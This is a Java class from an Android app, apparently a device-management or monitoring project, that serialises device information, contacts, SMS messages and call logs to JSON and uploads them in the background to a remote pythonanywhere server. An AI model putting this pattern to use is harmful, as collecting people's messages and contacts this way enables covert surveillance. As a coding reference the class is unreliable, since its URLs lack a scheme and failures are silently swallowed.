package corp.laouni.eaglesight;

import android.os.AsyncTask;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Created by Ishimwe on 12/3/2018.
 */

public class upstream {

    protected void formatDevInfoAsJSON(String a, String b, String c, String d, String e){

        final JSONObject uploads = new JSONObject();

        try {
            JSONArray data = new JSONArray();

            data.put(a);
            data.put(b);
            data.put(c);
            data.put(d);
            data.put(e);

            uploads.put("info", data);
            UpstreamToServer(uploads);
        }catch (JSONException E) {
            Log.d("Error formatdataJSON: ", E.toString());
        }
    }
    protected void formatDevDataAsJSON(String a, String b, String c, String d,String e, String f, String g, String h){

        final JSONObject uploads = new JSONObject();

        try {
            JSONArray data = new JSONArray();

            data.put(a);
            data.put(b);
            data.put(c);
            data.put(d);
            data.put(e);
            data.put(f);
            data.put(g);
            data.put(h);

            uploads.put("data", data);
            UpstreamToServer(uploads);
        }catch (JSONException E) {
            Log.d("Error formatdataJSON: ", E.toString());
        }
    }
    protected void formatContactsAsJSON(StringBuilder c){
        String contacts = c.toString();
        final JSONObject uploads = new JSONObject();

        try{
            uploads.put("contacts", contacts);
            UpstreamToServer(uploads);
        }catch (JSONException E){
            Log.d("Error: contact as JSON",E.toString());
        }
    }
    protected void formatSmsAsJSON(StringBuilder s){
        String sms = s.toString();
        final JSONObject uploads = new JSONObject();

        try{
            uploads.put("sms", sms);
            UpstreamToServer(uploads);
        }catch (JSONException E){
            Log.d("Error: SMS as JSON",E.toString());
        }
    }
    protected void formatCallLogAsJSON(StringBuilder cl){
        String call_log = cl.toString();
        final JSONObject uploads = new JSONObject();

        try{
            uploads.put("callLog", call_log);
            UpstreamToServer(uploads);
        }catch (JSONException E){
            Log.d("Error: CallLog as JSON",E.toString());
        }
    }
    protected void formatResponses(String r){
        final JSONObject uploads = new JSONObject();

        try {
            uploads.put("feedback", r);
            UpstreamToServer(uploads);
        }catch (JSONException E){
            Log.d("Error: feedback As JSON", E.toString());
        }
    }

    private void UpstreamToServer(JSONObject a){
        final JSONObject json = a;
        new AsyncTask<Void, Void, String>(){
            @Override
            protected String doInBackground(Void... params) {
                return getServerResponse(json);
            }

            @Override
            protected void onPostExecute(String result) {
                super.onPostExecute(result);

                Log.d("DataUpload : ",result);
            }
        }.execute();
    }


    private String getServerResponse(JSONObject json){
        String apiUrl1 = "loiclaouni.pythonanywhere.com/api/v1/luxmdm";
        String apiURL2 = "loiclaouni.pythonanywhere.com/api/v1/AppRegToken";
        String apiURL3 = "loiclaouni.pythonanywhere.com/api/v1/devdata";
        HttpURLConnection apiconnection = null;
        URL url;
        String response ="";
        try {
            if (json.has("info")){url = new URL(apiURL2);}
            else if (json.has("data")){url = new URL(apiURL3);}
            else if(json.has("contacts")){url = new URL(apiUrl1);}
            else if(json.has("sms")){url = new URL(apiUrl1);}
            else if (json.has("callLog")){url = new URL(apiUrl1);}
            else {url= new URL(apiUrl1);}

            apiconnection = (HttpURLConnection) url.openConnection();
            apiconnection.setRequestMethod("POST");
            apiconnection.setRequestProperty("Content-Type", "application/json");
            apiconnection.setRequestProperty("Accept","application/json");
            apiconnection.setDoOutput(true);
            apiconnection.setDoInput(true);
            DataOutputStream dataOut = new DataOutputStream(apiconnection.getOutputStream());
            dataOut.writeBytes(json.toString());
            dataOut.flush();
            dataOut.close();

            int responseCode = apiconnection.getResponseCode();
            String responseMsg = apiconnection.getResponseMessage();
            if (responseCode == -1){
                response = "Invalid HTTP response";
            }
            response = "Response Code: "+responseCode+"\nResponse Message: "+responseMsg;

        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            assert apiconnection != null;
            apiconnection.disconnect();
        }
        return  response;
    }
}
